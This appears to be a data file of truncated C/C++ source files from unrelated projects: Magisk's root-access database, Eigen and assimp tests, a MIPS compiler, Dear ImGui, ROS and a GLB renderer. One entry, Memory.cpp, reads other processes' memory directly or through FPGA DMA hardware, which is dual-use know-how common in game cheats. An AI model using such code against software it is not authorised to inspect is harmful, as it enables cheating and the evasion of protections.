\\\n}\n\n#define DLOAD(handle, arg) {\\\n    auto f = dlsym(handle, #arg); \\\n    DLERR(f) \\\n    *(void **) &(arg) = f; \\\n}\n\n#ifdef __LP64__\nconstexpr char apex_path[] = \"/apex/com.android.runtime/lib64:/apex/com.android.art/lib64:/apex/com.android.i18n/lib64:\";\n#else\nconstexpr char apex_path[] = \"/apex/com.android.runtime/lib:/apex/com.android.art/lib:/apex/com.android.i18n/lib:\";\n#endif\n\nstatic int dl_init = 0;\n\nstatic bool dload_sqlite() {\n    if (dl_init)\n        return dl_init > 0;\n    dl_init = -1;\n\n    auto sqlite = dlopen(\"libsqlite.so\", RTLD_LAZY);\n    if (!sqlite) {\n        // Should only happen on Android 10+\n        auto dl = dlopen(\"libdl_android.so\", RTLD_LAZY);\n        DLERR(dl);\n\n        DLOAD(dl, android_get_LD_LIBRARY_PATH);\n        DLOAD(dl, android_update_LD_LIBRARY_PATH);\n\n        // Inject APEX into LD_LIBRARY_PATH\n        char ld_path[4096];\n        memcpy(ld_path, apex_path, sizeof(apex_path));\n        constexpr int len = sizeof(apex_path) - 1;\n        android_get_LD_LIBRARY_PATH(ld_path + len, sizeof(ld_path) - len);\n        android_update_LD_LIBRARY_PATH(ld_path);\n        sqlite = dlopen(\"libsqlite.so\", RTLD_LAZY);\n\n        // Revert LD_LIBRARY_PATH just in case\n        android_update_LD_LIBRARY_PATH(ld_path + len);\n    }\n    DLERR(sqlite);\n\n    DLOAD(sqlite, sqlite3_open_v2);\n    DLOAD(sqlite, sqlite3_errmsg);\n    DLOAD(sqlite, sqlite3_close);\n    DLOAD(sqlite, sqlite3_exec);\n    DLOAD(sqlite, sqlite3_free);\n\n    dl_init = 1;\n    return true;\n}\n\nint db_strings::get_idx(string_view key) const {\n    int idx = 0;\n    for (const char *k : DB_STRING_KEYS) {\n        if (key == k)\n            break;\n        ++idx;\n    }\n    return idx;\n}\n\ndb_settings::db_settings() {\n    // Default settings\n    data[ROOT_ACCESS] = ROOT_ACCESS_APPS_AND_ADB;\n    data[SU_MULTIUSER_MODE] = MULTIUSER_MODE_OWNER_ONLY;\n    data[SU_MNT_NS] = NAMESPACE_MODE_REQUESTER;\n    data[DENYLIST_CONFIG] = false;\n    data[ZYGISK_CONFIG] = MagiskD::get()->is_emulator();\n}\n\nint db_settings::get_idx(string_view key) const {\n    int idx = 0;\n    for (const char *k : DB_SETTING_KEYS) {\n        if (key == k)\n            break;\n        ++idx;\n    }\n    return idx;\n}\n\nstatic int ver_cb(void *ver, int, char **data, char **) {\n    *((int *) ver) = parse_int(data[0]);\n    return 0;\n}\n\n#define err_ret(e) if (e) return e;\n\nstatic char *open_and_init_db(sqlite3 *&db) {\n    if (!dload_sqlite())\n        return strdup(\"Cannot load libsqlite.so\");\n\n    int ret = sqlite3_open_v2(MAGISKDB, &db,\n            SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE | SQLITE_OPEN_FULLMUTEX, nullptr);\n    if (ret)\n        return strdup(sqlite3_errmsg(db));\n    int ver = 0;\n    bool upgrade = false;\n    char *err = nullptr;\n    sqlite3_exec(db, \"PRAGMA user_version\", ver_cb, &ver, &err);\n    err_ret(err);\n    if (ver > DB_VERSION) {\n        // Don't support downgrading database\n        sqlite3_close(db);\n        return strdup(\"Downgrading database is not supported\");\n    }\n\n    auto create_policy = [&] {\n        sqlite3_exec(db,\n                \"CREATE TABLE IF NOT EXISTS policies \"\n                \"(uid INT, policy INT, until INT, logging INT, \"\n                \"notification INT, PRIMARY KEY(uid))\",\n                nullptr, nullptr, &err);\n    };\n    auto create_settings = [&] {\n        sqlite3_exec(db,\n                \"CREATE TABLE IF NOT EXISTS settings \"\n                \"(key TEXT, value INT, PRIMARY KEY(key))\",\n                nullptr, nullptr, &err);\n    };\n    auto create_strings = [&] {\n        sqlite3_exec(db,\n                \"CREATE TABLE IF NOT EXISTS strings \"\n                \"(key TEXT, value TEXT, PRIMARY KEY(key))\",\n                nullptr, nullptr, &err);\n    };\n    auto create_denylist = [&] {\n        s",
    "// This file is part of Eigen, a lightweight C++ template library\n// for linear algebra.\n//\n// This Source Code Form is subject to the terms of the Mozilla\n// Public License v. 2.0. If a copy of the MPL was not distributed\n// with this file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n// clang-format off\n#include \"main.h\"\n#include <Eigen/CXX11/Tensor>\n// clang-format on\n\n// -------------------------------------------------------------------------- //\n// A set of tests for TensorBlockIO: copying data between tensor blocks.\n\ntemplate <int NumDims>\nstatic DSizes<Index, NumDims> RandomDims(Index min, Index max) {\n  DSizes<Index, NumDims> dims;\n  for (int i = 0; i < NumDims; ++i) {\n    dims[i] = internal::random<Index>(min, max);\n  }\n  return DSizes<Index, NumDims>(dims);\n}\n\nstatic internal::TensorBlockShapeType RandomBlockShape() {\n  return internal::random<bool>()\n         ? internal::TensorBlockShapeType::kUniformAllDims\n         : internal::TensorBlockShapeType::kSkewedInnerDims;\n}\n\ntemplate <int NumDims>\nstatic size_t RandomTargetBlockSize(const DSizes<Index, NumDims>& dims) {\n  return internal::random<size_t>(1, dims.TotalSize());\n}\n\ntemplate <int Layout, int NumDims>\nstatic Index GetInputIndex(Index output_index,\n                           const array<Index, NumDims>& output_to_input_dim_map,\n                           const array<Index, NumDims>& input_strides,\n                           const array<Index, NumDims>& output_strides) {\n  int input_index = 0;\n  if (Layout == ColMajor) {\n    for (int i = NumDims - 1; i > 0; --i) {\n      const Index idx = output_index / output_strides[i];\n      input_index += idx * input_strides[output_to_input_dim_map[i]];\n      output_index -= idx * output_strides[i];\n    }\n    return input_index +\n           output_index * input_strides[output_to_input_dim_map[0]];\n  } else {\n    for (int i = 0; i < NumDims - 1; ++i) {\n      const Index idx = output_index / output_strides[i];\n      input_index += idx * input_strides[output_to_input_dim_map[i]];\n      output_index -= idx * output_strides[i];\n    }\n    return input_index +\n           output_index * input_strides[output_to_input_dim_map[NumDims - 1]];\n  }\n}\n\ntemplate <typename T, int NumDims, int Layout>\nstatic void test_block_io_copy_data_from_source_to_target() {\n  using TensorBlockIO = internal::TensorBlockIO<T, Index, NumDims, Layout>;\n  using IODst = typename TensorBlockIO::Dst;\n  using IOSrc = typename TensorBlockIO::Src;\n\n  // Generate a random input Tensor.\n  DSizes<Index, NumDims> dims = RandomDims<NumDims>(1, 30);\n  Tensor<T, NumDims, Layout> input(dims);\n  input.setRandom();\n\n  // Write data to an output Tensor.\n  Tensor<T, NumDims, Layout> output(dims);\n\n  // Construct a tensor block mapper.\n  using TensorBlockMapper =\n      internal::TensorBlockMapper<NumDims, Layout, Index>;\n  TensorBlockMapper block_mapper(\n      dims, {RandomBlockShape(), RandomTargetBlockSize(dims), {0, 0, 0}});\n\n  // We will copy data from input to output through this buffer.\n  Tensor<T, NumDims, Layout> block(block_mapper.blockDimensions());\n\n  // Precompute strides for TensorBlockIO::Copy.\n  auto input_strides = internal::strides<Layout>(dims);\n  auto output_strides = internal::strides<Layout>(dims);\n\n  const T* input_data = input.data();\n  T* output_data = output.data();\n  T* block_data = block.data();\n\n  for (int i = 0; i < block_mapper.blockCount(); ++i) {\n    auto desc = block_mapper.blockDescriptor(i);\n\n    auto blk_dims = desc.dimensions();\n    auto blk_strides = internal::strides<Layout>(blk_dims);\n\n    {\n      // Read from input into a block buffer.\n      IODst dst(blk_dims, blk_strides, block_data, 0);\n      IOSrc src(input_strides, input_data, desc.offset());\n\n      TensorBlockIO::Copy(dst, src);\n    }\n\n    {\n      // Write from block buffer to output.\n      IODst dst(blk_dims, output_strides, output_data, desc.offset());\n      IOSrc src(blk_strides, block_data, 0);\n\n      TensorBlockIO::Copy(dst, src);\n    }\n  }\n\n  for (int i = 0; i < dims.TotalSize(); ++i) {\n    VERIFY_IS_EQUAL(input_data[i], output_data[i]);\n  }\n}\n\ntemplate <typename T, int NumDims, int Layout>\nstatic void test_block_io_copy_using_reordered_dimensions() {\n  // Generate a random input Tensor.\n  DSizes<Index, NumDims> dims = RandomDims<NumDims>(1, 30);\n  Tensor<T, NumDims, Layout> input(dims);\n  input.setRandom();\n\n  // Create a random dimension re-ordering/shuffle.\n  std::vector<int> shuffle;\n\n  for (int i = 0; i < NumDims; ++i) shuffle.push_back(i);\n  std::shuffle(shuffle.begin(), shuffle.end(), std::mt19937(g_seed));\n\n  DSizes<Index, NumDims> output_tensor_dims;\n  DSizes<Index, NumDims> input_to_output_dim_map;\n  DSizes<Index, NumDims> output_to_input_dim_map;\n  for (Index i = 0; i < NumDims; ++i) {\n    output_tensor_dims[shuffle[i]] = dims[i];\n    input_to_output_dim_map[i] = shuffle[i];\n    output_to_input_dim_map[shuffle[i]] = i;\n  }\n\n  // Write data to an output Tensor.\n  Tensor<T, NumDims, Layout> output(output_tensor_dims);\n\n  // Construct a ten",
    "#include \"object.h\"\n#include \"../mips/utils.h\"\n\nnamespace memory {\nstd::vector<size_t> stk_size(1,128);\nstd::vector<int> global_tp_pos(1,0);\n\nint register_pos::RegNum = 0;\nregister_pos* register_pos::regs = new register_pos[32];\n\nstack_pos::stack_pos():sPos(-1), flag(-1){}\nstack_pos::stack_pos(size_t size) {  \n    if (global_tp_pos.back() + size > stk_size.back()) {\n        alloc_stack(stk_size.back());\n    }\n    sPos = global_tp_pos.back() + size;\n    global_tp_pos.back() += size;\n}\n\nnative::Str16 stack_pos::get_pos(size_t size) {\n    if (sPos == -1) {\n        debug(global_tp_pos, stk_size.back());\n        if (global_tp_pos.back() + size > stk_size.back()) {\n            alloc_stack(stk_size.back());\n        }\n        debug(\"alloc stackpos\");\n        sPos = global_tp_pos.back() + size;\n        global_tp_pos.back() += size;\n    }\n    debug(stk_size.back(), sPos);\n    return std::to_string(stk_size.back() - sPos) + \"($fp)\";\n}\n\nregister_pos::register_pos() {\n    rPos = RegNum ++;\n    this->nowUsing = nullptr;\n}\n\nnative::Str16 register_pos::get_pos() {\n    return \"$\" + std::to_string(rPos);\n}\n\nregister_pos* alloc_reg(obj::value_object* yue) {\n    for (int i = 8; i < 15; i ++) {\n        if (register_pos::regs[i].nowUsing == nullptr) {\n            register_pos::regs[i].nowUsing = yue;\n            return register_pos::regs + i;\n        }\n    }\n    return nullptr;\n}\n\nregister_pos* alloc_reg(obj::value_object* yue, int x) {\n    free_reg(register_pos::regs + x);\n    register_pos::regs[x].nowUsing = yue;\n    return register_pos::regs + x;\n}\n\nvoid free_reg(register_pos* reg) {\n    if (reg->nowUsing != nullptr) {\n        reg->nowUsing = nullptr;\n    }\n}\n\nvoid alloc_stack(size_t size, bool is_define) {\n    mips::binary_manage(\"addiu\", \"$sp\", -int(size), __PRETTY_FUNCTION__);\n    if (is_define) {\n        stk_size.push_back(size);\n        global_tp_pos.push_back(0);\n        save_fp();\n        move_fp();\n        return;\n    }\n    stk_size.back() += size;\n}\n\nvoid free_stack() {\n    load_fp();\n    mips::binary_manage(\"addiu\", \"$sp\", stk_size.back(), __PRETTY_FUNCTION__);\n    stk_size.pop_back();\n    global_tp_pos.pop_back();\n}\n\nvoid check_regs() {\n    std::cout << register_pos::RegNum << '\\n';\n    for (int i = 0; i < register_pos::RegNum; i ++) {\n        std::cout << ((register_pos::regs + i) -> nowUsing == nullptr) << ' ';\n    }\n    std::cout << std::endl;\n}\n\nvoid save_fp() {\n    int save_pos = stk_size.back() - 4;\n    global_tp_pos.back() += 4;\n    mips::binary_access(\"sw\", \"$fp\", std::to_string(save_pos) + \"($sp)\", __PRETTY_FUNCTION__);\n}\n\nvoid move_fp() {\n    mips::binary_access(\"move\", \"$fp\", \"$sp\", __PRETTY_FUNCTION__);\n}\n\nvoid load_fp() {\n    int save_pos = stk_size.back() - 4;\n    mips::binary_access(\"lw\", \"$fp\", std::to_string(save_pos) + \"($sp)\", __PRETTY_FUNCTION__);\n}\n\n} // namespace memory\n",
    "// dear imgui, v1.89.2\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// -------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n// -------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword:\n// In this demo code, we frequently use 'static' variables inside functions. A static variable persists across calls,\n// so it is essentially like a global variable but declared inside the scope of the function. We do this as a way to\n// gather code and data in the same place, to make the demo source code faster to read, faster to write, and smaller\n// in size. It also happens to be a convenient way of storing simple UI related information as long as your function\n// doesn't need to be reentrant or used in multiple threads. This might be a pattern you will want to use in your code,\n// but most of the real data you would be editing is likely going to be stored outside your functions.\n\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui_internal.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Fullscreen window / ShowExampleAppFullscreen()\n// [SECTION] Example App: Manipulating window titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION]",
    "#include \"Memory.h\"\n\n#ifdef USING_DMA\nVMM_HANDLE Memory::hVMM;\n#else\nHANDLE Memory::hProc;\n#endif\nproc Memory::currentProc{};\n\nbool Memory::Init()\n{\n#ifdef USING_DMA\n    LPSTR args[] = {(LPSTR) \"\", (LPSTR) \"-device\", (LPSTR) \"FPGA\"};\n    hVMM = VMMDLL_Initialize(3, args);\n    if (!hVMM)\n    {\n        std::cout << \"Failed to init VMM!\" << std::endl;\n        return false;\n    }\n#endif\n\n    return true;\n}\nvoid Memory::Exit()\n{\n#ifdef USING_DMA\n    VMMDLL_Close(hVMM);\n#endif\n}\n\nbool Memory::OpenProc(proc p)\n{\n#ifndef USING_DMA\n    HANDLE temp = OpenProcess(PROCESS_ALL_ACCESS, NULL, p.pid);\n    if (temp == INVALID_HANDLE_VALUE)\n    {\n        return false;\n    }\n    hProc = temp;\n#endif\n    currentProc = p;\n\n    return true;\n}\n\nstd::vector<procModule> Memory::GetMods()\n{\n    std::vector<procModule> mods;\n#ifdef USING_DMA\n    PVMMDLL_MAP_MODULE pModuleMap = NULL;\n    VMMDLL_Map_GetModuleU(hVMM, currentProc.pid, &pModuleMap, 0);\n\n    for (int i = 0; i < pModuleMap->cMap; i++)\n    {\n        mods.push_back({ std::string(pModuleMap->pMap[i].uszText), pModuleMap->pMap[i].vaBase });\n    }\n    VMMDLL_MemFree(pModuleMap);\n    pModuleMap = NULL;\n#else\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, currentProc.pid);\n    if (hSnap == INVALID_HANDLE_VALUE) return mods;\n\n    MODULEENTRY32 entry{};\n    entry.dwSize = sizeof(MODULEENTRY32);\n\n    if (Module32First(hSnap, &entry))\n    {\n        do {\n            procModule m{};\n            m.address = (uintptr_t)entry.modBaseAddr;\n            m.size = entry.modBaseSize;\n\n            size_t i;\n            char temp[MAX_PATH];\n            wcstombs_s(&i, temp, entry.szModule, 256);\n\n            m.name = temp;\n\n            mods.push_back(m);\n        } while (Module32Next(hSnap, &entry));\n    }\n#endif\n\n        return mods;\n}\n\nstd::vector<proc> Memory::GetProcs()\n{\n    std::vector<proc> procs;\n#ifdef USING_DMA\n    PVMMDLL_PROCESS_INFORMATION pdata = 0;\n    DWORD pword = 0;\n\n    VMMDLL_ProcessGetInformationAll(hVMM, &pdata, &pword);\n\n    for (int i = 0; i < pword; i++)\n    {\n        procs.push_back({ std::string(pdata[i].szName), pdata[i].dwPID });\n    }\n\n    VMMDLL_MemFree(pdata);\n#else\n\n    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    PROCESSENTRY32 entry{};\n    entry.dwSize = sizeof(PROCESSENTRY32);\n\n    if (Process32First(hSnap, &entry))\n    {\n        do {\n            proc p{};\n            p.pid = entry.th32ProcessID;\n\n            size_t i;\n            char temp[MAX_PATH];\n            wcstombs_s(&i, temp, entry.szExeFile, MAX_PATH);\n\n\n            procs.push_back({ temp, p.pid });\n        } while (Process32Next(hSnap, &entry));\n    }\n#endif\n    return procs;\n}\n\n\nstd::vector<byte> Memory::ReadMemory(uintptr_t address, DWORD size)\n{\n    std::vector<byte> bytes;\n    bytes.resize(size);\n#ifdef USING_DMA\n    VMMDLL_MemReadEx(hVMM, currentProc.pid, address, bytes.data(), size, 0, VMMDLL_FLAG_NOCACHE);\n#else\n    ReadProcessMemory(hProc, (LPCVOID)address, bytes.data(), size, nullptr);\n#endif\n\n    return bytes;\n}\n",
    "/*\nDevelopers: Jo\u00e3o Lehodey - joao.lehodey@tecnico.ulisboa.pt - DSOR/ISR team (Instituto Superior Tecnico) \n*/\n\n\n\n\n#include \"StateManager.h\"\n\n\n/**\n * @brief State Manager constructor\n*/\nStateManager::StateManager() : Node(\"glassy_state_manager\")\n{\n\n    // Initialize the parameters\n    this->declare_parameter(\"mission_type\", 2);\n    this->declare_parameter(\"rates/state_publishing\", 50);\n    this->declare_parameter(\"rates/actuator_publishing\", 40);\n    this->declare_parameter(\"rates/mission_info_publishing\", 2);\n    this->declare_parameter(\"timeouts/actuator_timeout\", 1500000000);\n    this->declare_parameter(\"timeouts/mission_timeout\", 20000000000);\n    this->declare_parameter(\"thrust_upper_limit\", 0.5);\n    this->declare_parameter(\"thrust_trim\", 0.0);\n    this->declare_parameter(\"rudder_trim\", 0.0);\n    this->declare_parameter(\"rudder_max_abs_input\", 1.0);\n    this->declare_parameter(\"gazebo_simulation\", true);\n\n\n\n    // get parameters\n    int state_publishing_rate = this->get_parameter(\"rates/state_publishing\").as_int();\n    int actuator_publishing_rate = this->get_parameter(\"rates/actuator_publishing\").as_int();\n    int mission_info_publishing_rate = this->get_parameter(\"rates/mission_info_publishing\").as_int();\n    int mission = this->get_parameter(\"mission_type\").as_int();\n    timeout_actuators_ = this->get_parameter(\"timeouts/actuator_timeout\").as_int();\n    mission_timeout_ = this->get_parameter(\"timeouts/mission_timeout\").as_int();\n    thrust_trim_ = this->get_parameter(\"thrust_trim\").as_double();\n    rudder_trim_ = this->get_parameter(\"rudder_trim\").as_double();\n    thrust_upper_limit_ = this->get_parameter(\"thrust_upper_limit\").as_double();\n    rudder_max_abs_input_ = this->get_parameter(\"rudder_max_abs_input\").as_double();\n    is_gazebo_simulator_ = this->get_parameter(\"gazebo_simulation\").as_bool();\n\n\n    // initialize parameter handlers\n    param_subscriber_ = std::make_shared<rclcpp::ParameterEventHandler>(this);\n\n    // define parameter callbacks\n    mission_type_callback_handler_ =param_subscriber_->add_parameter_callback(\"mission_type\", std::bind(&StateManager::mission_type_callback, this, std::placeholders::_1));\n    mission_timeout_callback_handler_= param_subscriber_->add_parameter_callback(\"timeouts/mission_timeout\", std::bind(&StateManager::mission_timeout_callback, this, std::placeholders::_1));\n    thrust_upper_limit_callback_handler_ = param_subscriber_->add_parameter_callback(\"thrust_upper_limit\", std::bind(&StateManager::thrust_upper_limit_callback, this, std::placeholders::_1));\n    rudder_max_abs_input_callback_handler_ = param_subscriber_->add_parameter_callback(\"rudder_max_abs_input\", std::bind(&StateManager::rudder_max_abs_input_callback, this, std::placeholders::_1));\n\n\n    // check that the mission type is valid\n\n    // Initialize the mission type based on the parameter\n    if(std::find(MissionTypes.begin(), MissionTypes.end(), mission) != MissionTypes.end()){\n        \n        mission_type_ = mission;\n    } else{\n        mission_type_ = MissionInfo::SUMMER_CHALLENGE;\n    }\n\n\n    // Initialize the variables\n    state_px4_msg_ = std::make_shared<glassy_msgs::msg::State>();\n    actuators_msg_ = std::make_shared<glassy_msgs::msg::Actuators>();\n    thrust_msg_ = std::make_shared<VehicleThrustSetpoint>();\n    torque_msg_ = std::make_shared<VehicleTorqueSetpoint>();\n    mission_info_msg_ = std::make_shared<glassy_msgs::msg::MissionInfo>();\n\n\n    // Initialize the mission status\n    mission_info_msg_->mission_mode = glassy_msgs::msg::MissionInfo::MISSION_OFF;\n\n    // Initialize publishers\n    state_px4_publisher_ = this->create_publisher<glassy_msgs::msg::State>(\"/glassy/state\", 1);\n    offboard_control_mode_publisher_ = this->create_publisher<OffboardControlMode>(\"/fmu/in/offboard_control_mode\", 10);\n    thrust_setpoint_publisher_ = this->create_publisher<VehicleThrustSetpoint>(\"/fmu/in/vehicle_thrust_setpoint\", 10);\n    torque_setpoint_publisher_ = this->create_publisher<VehicleTorqueSetpoint>(\"/fmu/in/vehicle_torque_setpoint\", 10);\n    vehicle_command_publisher_ = this->create_publisher<VehicleCommand>(\"/fmu/in/vehicle_command\", 10);\n    mission_info_publisher_ = this->create_publisher<glassy_msgs::msg::MissionInfo>(\"/glassy/mission_status\", 10);\n\n    //subriber profile\n    rmw_qos_profile_t qos_profile = rmw_qos_profile_sensor_data;\n    auto qos = rclcpp::QoS(rclcpp::QoSInitialization(qos_profile.history, 5), qos_profile);\n\n    //Initialize subscribers\n    vehicle_control_mode_ = this->create_subscription<VehicleControlMode>(\"fmu/out/vehicle_control_mode\", qos, std::bind(&StateManager::vehicle_control_mode_callback, this, std::placeholders::_1));\n\n    vehicle_odometry_ = this->create_subscription<VehicleOdometry>(\"fmu/out/vehicle_odometry\", qos, std::bind(&StateManager::vehicle_odometry_callback, this, std::placeholders::_1));\n\n    actuator_glassy_subscriber_ = this->create_subscription<glassy_msgs::msg::Actuators>(\"/glassy/actuators\",1,  std::bind(&StateManager::actuator_glassy_",
    "/*\n---------------------------------------------------------------------------\nOpen Asset Import Library (assimp)\n---------------------------------------------------------------------------\n\nCopyright (c) 2006-2024, assimp team\n\nAll rights reserved.\n\nRedistribution and use of this software in source and binary forms,\nwith or without modification, are permitted provided that the following\nconditions are met:\n\n* Redistributions of source code must retain the above\ncopyright notice, this list of conditions and the\nfollowing disclaimer.\n\n* Redistributions in binary form must reproduce the above\ncopyright notice, this list of conditions and the\nfollowing disclaimer in the documentation and/or other\nmaterials provided with the distribution.\n\n* Neither the name of the assimp team, nor the names of its\ncontributors may be used to endorse or promote products\nderived from this software without specific prior\nwritten permission of the assimp team.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n\"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\nLIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\nA PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT\nOWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT\nLIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\nDATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\nTHEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\nOF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n---------------------------------------------------------------------------\n*/\n#include \"AbstractImportExportBase.h\"\n#include \"UnitTestPCH.h\"\n#include <assimp/postprocess.h>\n#include <assimp/scene.h>\n#include <assimp/Importer.hpp>\n\nusing namespace Assimp;\n\nclass utRAWImportExport : public AbstractImportExportBase {\npublic:\n    virtual bool importerTest() {\n        Assimp::Importer importer;\n        const aiScene *scene = importer.ReadFile(ASSIMP_TEST_MODELS_DIR \"/RAW/Wuson.raw\", aiProcess_ValidateDataStructure);\n#ifndef ASSIMP_BUILD_NO_RAW_IMPORTER\n        return nullptr != scene;\n#else\n        return nullptr == scene;\n#endif\n    }\n};\n\nTEST_F(utRAWImportExport, importSimpleRAWTest) {\n    EXPECT_TRUE(importerTest());\n}\n",
    "#include \"apriltag_mit/apriltag_mit.h\"\n\n#include <gtest/gtest.h>\n#include <opencv2/highgui/highgui.hpp>\n#include <ros/package.h>\n\nusing namespace apriltag_mit;\nusing testing::Test;\nusing testing::WithParamInterface;\nusing testing::Values;\n\nclass SampleImageTest : public Test {\nprotected:\n  SampleImageTest()\n      : package_name_(\"apriltag_mit\"),\n        package_path_(ros::package::getPath(package_name_)),\n        image_path_(package_path_ + \"/image/tag_sampler.png\"),\n        test_image_(cv::imread(image_path_, CV_LOAD_IMAGE_GRAYSCALE)) {}\n\n  std::string package_name_, package_path_, image_path_;\n  cv::Mat test_image_;\n};\n\nclass TagFamilyTest : public SampleImageTest,\n                      public WithParamInterface<TagCodes> {\npublic:\n  TagFamilyTest() : tag_detector_(GetParam()) {}\n\nprotected:\n  TagDetector tag_detector_;\n};\n\nTEST_P(TagFamilyTest, Detection) {\n  const auto tag_detection = tag_detector_.ExtractTags(test_image_);\n  EXPECT_EQ(4, tag_detection.size());\n}\n\nINSTANTIATE_TEST_CASE_P(ThreeTagFamilies, TagFamilyTest,\n                        Values(tag_codes_36h11, tag_codes_25h9,\n                               tag_codes_16h5));\n\nint main(int argc, char **argv) {\n  testing::InitGoogleTest(&argc, argv);\n  return RUN_ALL_TESTS();\n}\n",
    "#include <GL/glut.h> // For OpenGL rendering\n#include <iostream> // For standard I/O operations\n#include <memory> // For smart pointers\n#include <cstring> // For string operations\n#include <random> // For generating random file names\n#include <dirent.h> // For directory operations\n#include <cstdio>   // For file I/O\n#include <unistd.h> // For getopt and optarg\n#include \"stb/stb_image_write.h\" // For STB image write operations\n#include \"tinygltf/tiny_gltf.h\" // For loading GLB files\n#include <sys/stat.h> // For checking file existence\n#include <cmath> // For mathematical operations\n#include <GL/glu.h> // For GLU functions\n\n#ifdef _WIN32\n#include <Windows.h> // For Windows specific operations\n#endif\n\nstruct RenderParams {\n    std::string glb_file_path;\n    std::string output_file_name;\n    std::string output_folder_path;\n    std::string file_type; // Options: png, jpg, jpeg\n    std::string render_mode; // Default: gpu. Options: cpu, gpu\n};\n\nstd::string to_lowercase(const std::string &str) {\n    std::string result;\n    for (char c: str) {\n        result += std::tolower(c);\n    }\n    return result;\n}\n\nstd::string generate_unique_output_file_name(const std::string &output_folder_path) {\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_int_distribution<> dis(0, 35);\n\n    std::string output_file_name;\n\n    while (true) {\n        output_file_name.clear(); // Clear the string for generating a new name\n        for (int i = 0; i < 32; ++i) {\n            output_file_name.push_back(\"abcdefghijklmnopqrstuvwxyz0123456789\"[dis(gen)]);\n        }\n\n        // Check for existence of file with the same name, if found, generate a new name\n        DIR *dir;\n        struct dirent *ent;\n        bool found = false;\n        if ((dir = opendir(output_folder_path.c_str())) != nullptr) {\n            while ((ent = readdir(dir)) != nullptr) {\n                if (ent->d_type == DT_REG && std::strcmp(ent->d_name, output_file_name.c_str()) == 0) {\n                    found = true;\n                    break;\n                }\n            }\n            closedir(dir);\n        } else {\n            std::cerr << \"\\nError opening output directory.\\n\";\n            exit(EXIT_FAILURE);\n        }\n\n        if (!found) 